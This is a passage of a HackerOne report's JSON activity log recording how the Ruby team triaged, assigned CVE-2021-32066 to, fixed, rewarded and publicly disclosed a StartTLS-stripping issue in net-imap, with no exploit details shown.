]\n","automated_response":false,"created_at":"2021-05-07T00:12:15.969Z","updated_at":"2021-05-07T00:12:15.969Z","actor":{"username":"shugo","cleared":false,"url":"/shugo","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/076/177/c63f990ae1ef62a77c2ff1e5b2db5e4dd3db2557_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11650825,"is_internal":false,"editable":false,"type":"Activities::CveIdAdded","message":"","automated_response":false,"created_at":"2021-05-07T02:43:28.510Z","updated_at":"2021-05-07T02:43:28.510Z","cve_ids":["CVE-2021-32066"],"actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/dx6z1zqthgan1c4rv9ppn4jx3832/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%222eUvHh_4_400x400.png%22%3B%20filename%2A%3DUTF-8%27%272eUvHh_4_400x400.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ76PP2BUX%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T133008Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCIGHP7cIwt2Tsf8KjliDyT5Lb7ly0JskiaYe2ChAX3AmbAiAqtHMw8uLFecT9g9U5UE%2FCxE1a%2BtPZJAnSYYnH2BI8piqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMzMSFx2nvHLNo5SLgKtcDcW%2FgFn8cU0mgC1%2FVdGfTPYSBsMiGZbBVEFWLz7BIkAjvx1Yl0xNwccsia5mxGh5Pof1BmLOj%2FPbfN0yxfjTbBvX%2BtxFisFe4lleD7sAfIMQHgrItYYlJlrAkcGTOF0hj5oy17q8C901VMWg1M3Oq1DUHqNUDjNiOuNs3pYI8%2F%2FpJPSaJwkT0kt%2FgzY3%2FaZ0aVY4K5doqZxp2VxJBM6CwnM47o6IbMvH%2F6hCdkC2dfUYQhPAa%2FygUp%2Fmm%2FrBM1LnDwRHK5mENZHzc9lNN77yHKCN1H3z9bi6t%2FdgHvkJFjucgPEBep99zqb1GTqjJfJh62po7%2FS6VgiubeoT%2ByWP%2FtbqeYVZAMxxgiX1mB4dTzOp9zUHuTJ5nixo2KbV6zjXbuM3CsrhUAywRCeq1ysa5sihESBZMzWy4KTeSnnVgA3YGSpb6bjYVcuyXShrdtMdh%2Bi%2Fut350eVReQuhtta9UeSQASWy1DEqou8oW6%2BWrK%2Fu8ty%2Bdy03u84XY3jIFi15g20CivixBXwDrJq5GMnahFYcvlzz%2FNfvLxBKnaZyOEiCkM%2BOhX4C4%2BLxcdNS1%2B%2FJZkMdX5isJd3PLZxJ0Za4ah4jaZUkoTXoWEByAePJ%2FcQ2oGnMS56ZNMLTgkIsGOqYBDJcz6RvFiMKVMfgvSf0yaXoPP4o%2BD%2Fa8JI%2BvkanDoFK0GH2rrIW6QMEbvg1sbDA%2B9VmM8kFxkCwfS%2F888Z5ykzUXec2dE5NYyugHVg5stjEJdkzVfFm30TsJCuULkIUdUPpiclOA72MSSbJsTlChJhjuLyQb8nARpH6iLndWaVXQjXW0hsGl9kRoYIkectIjPcMElLSYn47zPkurLskrWPNIcaHBlw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=82d52d0bbdaed07ed6e2accdfc62f7555e6e03aeb2037b9855022d4056b7a38a"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11677955,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2021-05-10T04:25:08.392Z","updated_at":"2021-05-10T04:25:08.392Z","actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/dx6z1zqthgan1c4rv9ppn4jx3832/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%222eUvHh_4_400x400.png%22%3B%20filename%2A%3DUTF-8%27%272eUvHh_4_400x400.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ76PP2BUX%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T133008Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCIGHP7cIwt2Tsf8KjliDyT5Lb7ly0JskiaYe2ChAX3AmbAiAqtHMw8uLFecT9g9U5UE%2FCxE1a%2BtPZJAnSYYnH2BI8piqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMzMSFx2nvHLNo5SLgKtcDcW%2FgFn8cU0mgC1%2FVdGfTPYSBsMiGZbBVEFWLz7BIkAjvx1Yl0xNwccsia5mxGh5Pof1BmLOj%2FPbfN0yxfjTbBvX%2BtxFisFe4lleD7sAfIMQHgrItYYlJlrAkcGTOF0hj5oy17q8C901VMWg1M3Oq1DUHqNUDjNiOuNs3pYI8%2F%2FpJPSaJwkT0kt%2FgzY3%2FaZ0aVY4K5doqZxp2VxJBM6CwnM47o6IbMvH%2F6hCdkC2dfUYQhPAa%2FygUp%2Fmm%2FrBM1LnDwRHK5mENZHzc9lNN77yHKCN1H3z9bi6t%2FdgHvkJFjucgPEBep99zqb1GTqjJfJh62po7%2FS6VgiubeoT%2ByWP%2FtbqeYVZAMxxgiX1mB4dTzOp9zUHuTJ5nixo2KbV6zjXbuM3CsrhUAywRCeq1ysa5sihESBZMzWy4KTeSnnVgA3YGSpb6bjYVcuyXShrdtMdh%2Bi%2Fut350eVReQuhtta9UeSQASWy1DEqou8oW6%2BWrK%2Fu8ty%2Bdy03u84XY3jIFi15g20CivixBXwDrJq5GMnahFYcvlzz%2FNfvLxBKnaZyOEiCkM%2BOhX4C4%2BLxcdNS1%2B%2FJZkMdX5isJd3PLZxJ0Za4ah4jaZUkoTXoWEByAePJ%2FcQ2oGnMS56ZNMLTgkIsGOqYBDJcz6RvFiMKVMfgvSf0yaXoPP4o%2BD%2Fa8JI%2BvkanDoFK0GH2rrIW6QMEbvg1sbDA%2B9VmM8kFxkCwfS%2F888Z5ykzUXec2dE5NYyugHVg5stjEJdkzVfFm30TsJCuULkIUdUPpiclOA72MSSbJsTlChJhjuLyQb8nARpH6iLndWaVXQjXW0hsGl9kRoYIkectIjPcMElLSYn47zPkurLskrWPNIcaHBlw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=82d52d0bbdaed07ed6e2accdfc62f7555e6e03aeb2037b9855022d4056b7a38a"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":12392104,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We have released new versions of Ruby and have published the vulnerability.\n\n  https://www.ruby-lang.org/en/news/2021/07/07/starttls-stripping-in-net-imap/\n\nThank you.\n","automated_response":false,"created_at":"2021-07-08T01:08:22.126Z","updated_at":"2021-07-08T01:08:22.126Z","actor":{"username":"shugo","cleared":false,"url":"/shugo","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/076/177/c63f990ae1ef62a77c2ff1e5b2db5e4dd3db2557_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"chinarulezzz","url":"/chinarulezzz"},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":12392106,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-07-08T01:09:28.789Z","updated_at":"2021-07-08T01:09:28.789Z","first_to_agree":true,"actor":{"username":"shugo","cleared":false,"url":"/shugo","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/076/177/c63f990ae1ef62a77c2ff1e5b2db5e4dd3db2557_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":12392188,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2021-07-08T01:39:07.635Z","updated_at":"2021-07-08T01:39:07.635Z","actor":{"url":"/ruby","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Ruby"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"ruby","collaborator":{"username":"chinarulezzz","url":"/chinarulezzz"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":12404174,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-07-08T15:34:20.126Z","updated_at":"2021-07-08T15:34:20.126Z","actor":{"username":"chinarulezzz","cleared":false,"url":"/chinarulezzz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/8bTs1ocGqLJRNZAWnFyrSfqK/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":12404175,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-07-08T15:34:20.224Z","updated_at":"2021-07-08T15:34:20.224Z","actor":{"username":"chinarulezzz","cleared":false,"url":"/chinarulezzz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/8bTs1ocGqLJRNZAWnFyrSfqK/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}